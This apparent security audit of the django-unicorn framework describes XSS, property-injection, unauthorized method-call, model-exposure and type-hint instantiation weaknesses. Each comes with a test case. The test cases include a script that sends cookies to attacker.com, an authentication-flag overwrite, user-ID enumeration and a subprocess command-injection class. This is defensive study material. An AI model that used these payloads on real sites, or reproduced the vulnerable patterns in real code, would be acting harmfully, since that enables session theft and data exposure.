# Django-Unicorn Security Vulnerabilities

## Cross-Site Scripting (XSS) via HTML Sanitization Bypass

### Description
In versions prior to 0.36.0, django-unicorn didn't encode HTML responses by default, which could lead to cross-site scripting vulnerabilities. While this issue was addressed in version 0.36.0 (as noted in the changelog for CVE-2021-42053), the framework still allows developers to explicitly opt-out of HTML encoding through the `safe` attribute in a component's `Meta` class. If a field is marked as "safe" and contains user-controlled input, this could result in XSS.

### Impact
An attacker could execute arbitrary JavaScript in a victim's browser context if they can inject malicious code into a field that is marked as "safe". This could lead to cookie theft, session hijacking, and other client-side attacks.

### Vulnerability Rank
High

### Currently Implemented Mitigations
- As of v0.36.0, django-unicorn HTML encodes responses by default
- Developers must explicitly opt-in to disable HTML encoding for specific fields

### Missing Mitigations
- No runtime warnings when using `safe` with user-controlled input
- No built-in content security policy recommendations

### Preconditions
1. The application must use a component with fields marked as "safe" in the `Meta` class
2. These "safe" fields must contain user-controlled input

### Source Code Analysis
The vulnerability is rooted in the ability for developers to mark fields as "safe" in a component's `Meta` class:

```python
class SafeExampleView(UnicornView):
    something_safe = ""

    class Meta:
        safe = ("something_safe", )
```

When a field is marked as "safe", django-unicorn will not HTML encode its value before sending it to the client. If an attacker can control the content of `something_safe`, they could inject malicious JavaScript.

For example, if an application has a component that takes user input and stores it in a field marked as "safe":

```python
def save_user_input(self):
    self.something_safe = self.user_input  # self.user_input contains attacker-controlled data
```

When rendered in a template like:

```html
<div>
  {{ something_safe }}  <!-- This will not be HTML encoded -->
</div>
```

If `self.user_input` contains `<script>alert(document.cookie)</script>`, this JavaScript would be executed in the victim's browser.

### Security Test Case
1. Create a component with a field marked as "safe":
   ```python
   class VulnerableComponent(UnicornView):
       user_input = ""
       output = ""

       class Meta:
           safe = ("output",)

       def process_input(self):
           self.output = self.user_input
   ```

2. Create a template that uses this component:
   ```html
   <div>
     <input unicorn:model="user_input" type="text">
     <button unicorn:click="process_input">Process</button>
     <div>{{ output }}</div>
   </div>
   ```

3. As an attacker, input the following into the text field:
   ```
   <script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>
   ```

4. Click the "Process" button.
5. The script will execute in the victim's browser, sending their cookies to the attacker's server.

## Prototype Pollution through Dynamic Property Setting

### Description
Django-unicorn dynamically sets properties on components based on data received from client requests. If an attacker can manipulate this data, they might be able to set arbitrary properties on component objects, which could lead to prototype pollution or other unexpected behavior.

### Impact
An attacker could potentially modify core functionality of the application, bypass security checks, or inject unexpected behavior. In extreme cases, this could lead to server-side code execution.

### Vulnerability Rank
High

### Currently Implemented Mitigations
- The framework has some validation against setting non-existent properties
- Type checking is performed when possible

### Missing Mitigations
- No comprehensive validation of property names
- No allowlist of safe properties to set

### Preconditions
1. The application must use components with dynamic properties
2. An attacker must be able to manipulate the request data

### Source Code Analysis
In `django_unicorn/components/unicorn_view.py`, the `_set_property` method sets properties on components based on received data:

```python
def _set_property(
    self,
    name: str,
    value: Any,
    *,
    call_updating_method: bool = False,
    call_updated_method: bool = False,
    call_resolved_method: bool = False,
) -> None:
    # Get the correct value type by using the form if it is available
    data = self._attributes()

    value = cast_attribute_value(self, name, value)
    data[name] = value

    # ... type checking and other logic ...

    try:
        setattr(self, name, value)

        # Call hook methods if needed
    except AttributeError:
        raise
```

This property setting is triggered via client requests through the action parsers, as seen in `sync_input.py`:

```python
def handle(component_request: ComponentRequest, component: UnicornView, payload: Dict):
    property_name = payload.get("name")
    property_value = payload.get("value")

    # Logic for determining whether to call resolved methods

    set_property_value(
        component, property_name, property_value, component_request.data, call_resolved_method=call_resolved_method
    )
```

While there are checks to ensure properties exist (through `hasattr`), there's still a risk that an attacker could set sensitive properties that shouldn't be modified by user input, such as internal methods or properties used for security checks.

### Security Test Case
1. Create a component with a security-sensitive property:
   ```python
   class SecureComponent(UnicornView):
       is_authenticated = False
       sensitive_data = "Only for authenticated users"

       def get_data(self):
           if self.is_authenticated:
               return self.sensitive_data
           return "Access denied"
   ```

2. As an attacker, intercept a request to the component and add the sensitive property:
   ```json
   {
     "data": {
       "is_authenticated": true
     }
   }
   ```

3. When the server processes this request, it will set `is_authenticated` to `True`.
4. Subsequent calls to `get_data` will return the sensitive data.

## Unauthorized Method Execution

### Description
Django-Unicorn allows calling component methods from the frontend through AJAX requests. The framework processes these requests in the backend, allowing methods to be called on Python components based on frontend input. While the framework uses AST parsing for method name extraction (which is safer than using `eval()`), there appears to be no validation mechanism to restrict which methods can be called. This allows potential attackers to call any public method on a component, including those that were not intended to be exposed to the frontend.

### Impact
An attacker who can access the frontend application could potentially invoke sensitive methods that perform critical operations such as data deletion, privilege escalation, or accessing sensitive information, even if these methods were not intended to be called from the client side.

### Vulnerability Rank
High

### Currently Implemented Mitigations
The framework includes CSRF protection which prevents cross-site request forgery attacks, but there appears to be no specific mechanism to restrict which methods can be called on a component from the frontend. It also uses checksum validation to verify the integrity of incoming data.

### Missing Mitigations
1. There is no method whitelist/allowlist feature to explicitly declare which methods are allowed to be called from the frontend.
2. No automatic protection against calling private/protected methods (those starting with `_`).
3. No decorator or annotation system to mark methods as "public" for frontend invocation.
4. No deeper validation of method arguments.

### Preconditions
- The attacker needs access to the frontend application.
- The attacker needs to know or discover component names and method names.
- The application must include a component with sensitive methods that perform privileged operations.

### Source Code Analysis
In `call_method_parser.py`, the function `parse_call_method_name` extracts method names and arguments from request payloads:

```python
def parse_call_method_name(call_method_name: str):
    """
    Parses the method name from the request payload into a set of parameters to pass to
    a method.
    """
    is_special_method = False
    args: List[Any] = []
    kwargs: Dict[str, Any] = {}
    method_name = call_method_name

    # Deal with special methods that start with a "$"
    if method_name.startswith("$"):
        is_special_method = True
        method_name = method_name[1:]

    tree = ast.parse(method_name, "eval")
    statement = tree.body[0].value

    if tree.body and isinstance(statement, ast.Call):
        call = tree.body[0].value
        method_name = call.func.id
        args = [eval_value(arg) for arg in call.args]
        kwargs = {kw.arg: eval_value(kw.value) for kw in call.keywords}

    # Add "$" back to special functions
    if is_special_method:
        method_name = f"${method_name}"

    return method_name, tuple(args), MappingProxyType(kwargs)
```

While this parsing is relatively safe (using AST rather than direct `eval()`), it does not contain any validation of which methods can be called.

In `views/action_parsers/call_method.py`, the framework attempts to call methods with appropriate type conversion of arguments:

```python
def _call_method_name(component: UnicornView, method_name: str, args: Tuple[Any], kwargs: Dict[str, Any]) -> Any:
    """
    Calls the method name with parameters.

    Args:
        param component: Component to call method on.
        param method_name: Method name to call.
        param args: Tuple of arguments for the method.
        param kwargs: Dictionary of kwargs for the method.
    """

    if method_name is not None and hasattr(component, method_name):
        func = getattr(component, method_name)

        parsed_args: List[Any] = []
        parsed_kwargs = {}
        arguments = get_method_arguments(func)
        type_hints = get_type_hints(func)
```

This code will call any method on the component as long as it exists, with no check for whether it was intended to be called from the frontend.

### Security Test Case
1. Identify an application built with Django-Unicorn that has a component with a sensitive method, for example:

```python
class AdminComponent(UnicornView):
    def delete_user(self, user_id):
        # Delete a user from the database
        User.objects.get(id=user_id).delete()

    def view_user_data(self, user: User):
        # Return sensitive user data
        return user.get_sensitive_data()
```

2. Craft a JavaScript attack to call these methods:

```javascript
// Call method with primitive argument
Unicorn.call('admin-component', 'delete_user', 123);

// Call method with Model type parameter - will fetch User with ID 456 from database
Unicorn.call('admin-component', 'view_user_data', 456);
```

3. Verify that the method executes without any authorization check, potentially:
   - Deleting a user that the current user shouldn't be able to delete
   - Accessing sensitive data for a user that the current user shouldn't be able to view

4. For methods not exposed through UI elements (hidden methods), discover them through source code inspection or trial and error with common method names.

## Model Exposure Through Model Type Hints

### Description
Django-Unicorn automatically attempts to fetch model instances from the database when a component method has a parameter with a Django Model type hint. When calling a method from the frontend, if the method's parameter is typed as a Django Model, the framework will automatically retrieve that model from the database using the provided primary key. This could allow an attacker to access model instances they shouldn't have access to, as there's no validation that the current user has permission to view or manipulate that model instance.

### Impact
An attacker could potentially access any model instance in the database by calling a method with the appropriate type hint and providing the primary key. This could lead to unauthorized access to sensitive data, including data belonging to other users, which is a serious privacy and security breach.

### Vulnerability Rank
High

### Currently Implemented Mitigations
There are no automatic mitigations for this issue. The framework relies on developers to implement their own access control checks within each method, but doesn't provide any built-in protection against unauthorized model access.

### Missing Mitigations
1. No automatic permission checking when retrieving model instances based on type hints.
2. No way to specify which models are allowed to be accessed from the frontend.
3. No input validation for model primary keys provided from the frontend.

### Preconditions
- The attacker needs access to the frontend application.
- The application includes a component with methods that have Django Model type hints.
- The attacker needs to know or guess valid primary keys for the target models.

### Source Code Analysis
In `django_unicorn/views/action_parsers/call_method.py`, the method `_call_method_name` handles calling component methods. When a parameter has a Model type hint, it automatically fetches the model from the database:

```python
if is_model:
    DbModel = type_hint  # noqa: N806
    key = "pk"
    value = None

    if not kwargs:
        value = args[len(parsed_args)]
        parsed_args.append(DbModel.objects.get(**{key: value}))
    else:
        value = kwargs.get("pk")
        parsed_kwargs[argument] = DbModel.objects.get(**{key: value})
```

This code automatically fetches any model instance based solely on its primary key, without any permission checks. The model is fetched using `DbModel.objects.get(**{key: value})`, which means it will retrieve the model even if the user shouldn't have access to it.

The framework doesn't provide any built-in way to restrict which models can be accessed or to perform permission checks before retrieving a model.

### Security Test Case
1. Identify a Django-Unicorn component with a method that accepts a Django model parameter:

```python
class UserProfileComponent(UnicornView):
    def show_profile(self, user: User):
        # Display user profile
        self.profile_data = {
            'username': user.username,
            'email': user.email,
            'private_data': user.private_data
        }
```

2. Craft a JavaScript call to access a model instance the current user shouldn't have access to:

```javascript
// Assuming the current user is a regular user, attempt to access an admin user's data
const adminUserId = 1;  // Usually admin users have low IDs
Unicorn.call('user-profile-component', 'show_profile', adminUserId);
```

3. Verify that the method executes and exposes data from the admin user that the current user shouldn't have access to.

4. Try to access sensitive models by enumerating different model type hints:

```javascript
// Try different user IDs to access other user accounts
for (let i = 1; i <= 10; i++) {
    Unicorn.call('user-profile-component', 'show_profile', i);
}
```

5. Examine the component's state or response to confirm unauthorized access to the model data.

## Server-Side Object Instantiation via Type Hints

### Description
Django-Unicorn dynamically instantiates Python classes based on type hints from component definitions and data from HTTP requests. The framework uses the component's type hints to determine how to deserialize the data. This creates a security risk where an attacker can trigger the instantiation of classes with dangerous side effects in their constructors by sending specially crafted data.

### Impact
Depending on the classes that can be instantiated, this vulnerability could lead to:
- Arbitrary code execution
- Information disclosure
- Database corruption
- Server compromise

### Vulnerability Rank
High

### Currently Implemented Mitigations
The framework includes a checksum validation mechanism that helps protect against tampering with the data. This validation uses HMAC with Django's SECRET_KEY to verify the integrity of incoming data. It also uses `ast.parse` and `ast.literal_eval` for parsing arguments, which is safer than `eval()`.

### Missing Mitigations
1. Implement stricter validation of class instantiation
2. Maintain a whitelist of allowed classes that can be instantiated
3. Provide clear documentation about the risks of using type hints for classes with side effects
4. No comprehensive validation of complex nested objects
5. Insufficient restrictions on what types can be deserialized

### Preconditions
1. A component must define properties with type hints for classes with dangerous side effects
2. The attacker must be able to craft inputs that trigger those side effects
3. The attacker must be able to bypass checksum validation or the SECRET_KEY must be compromised

### Source Code Analysis
The issue begins in the `typer.py` file in the `cast_value` function. When a request comes in to update a component property, this function is called to convert the incoming data to the appropriate type based on the component's type hints:

```python
def cast_value(type_hint, value):
    # ...
    for _type_hint in type_hints:
        # ...
        if _check_pydantic(_type_hint) or is_dataclass(_type_hint):
            value = _type_hint(**value)
            break

        value = _type_hint(value)
        break
```

This directly uses the passed-in value to instantiate objects. While there is a check to avoid directly instantiating Django models:

```python
if issubclass(_type_hint, Model):
    continue
```

Other Python classes are instantiated without restriction. This means if a component has a property with a type hint pointing to a class with dangerous side effects in its constructor, an attacker could craft data to trigger those effects.

In `django_unicorn/typer.py`, the `cast_value` function attempts to cast values based on type hints, but also allows direct instantiation of classes:

```python
if _check_pydantic(_type_hint) or is_dataclass(_type_hint):
    value = _type_hint(**value)
    break

value = _type_hint(value)
break
```

When handling model objects, Django-Unicorn attempts to create model instances from deserialized data:

```python
if is_model:
    DbModel = type_hint  # noqa: N806
    key = "pk"
    value = None

    if not kwargs:
        value = args[len(parsed_args)]
        parsed_args.append(DbModel.objects.get(**{key: value}))
    else:
        value = kwargs.get("pk")
        parsed_kwargs[argument] = DbModel.objects.get(**{key: value})
```

While these mechanisms are generally safer than direct `eval()`, the complex processing of arguments and dynamic instantiation of objects could still lead to security issues, especially with complex nested objects.

### Security Test Case
1. Create a component with a property type-hinted as a class with dangerous side effects:
   ```python
   class DangerousClass:
       def __init__(self, cmd=None):
           if cmd:
               import subprocess
               subprocess.run(cmd, shell=True)

   class VulnerableComponent(UnicornView):
       dangerous: DangerousClass = None
   ```
2. Deploy the application and obtain a valid session with authentication
3. Craft a payload to update the `dangerous` property:
   ```json
   {
     "data": {"dangerous": {"cmd": "id > /tmp/pwned"}},
     "checksum": "<valid_checksum>",
     "id": "<component_id>",
     "epoch": 123456789,
     "actionQueue": [
       {
         "type": "syncInput",
         "payload": {"name": "dangerous", "value": {"cmd": "id > /tmp/pwned"}}
       }
     ]
   }
   ```
4. Send the payload to the `/message/vulnerable-component` endpoint
5. Verify that the command was executed by checking for the existence of `/tmp/pwned`
